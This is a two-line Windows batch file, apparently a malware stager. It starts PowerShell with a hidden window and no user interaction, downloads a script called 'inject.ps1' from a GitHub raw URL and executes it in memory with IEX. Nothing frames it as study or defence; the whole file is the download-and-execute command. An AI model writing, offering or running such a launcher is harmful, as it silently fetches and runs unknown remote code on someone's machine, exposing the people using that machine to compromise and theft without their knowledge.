@echo off
powershell -NoP -sta -NonI -W Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Mouted/Hos/main/inject.ps1')"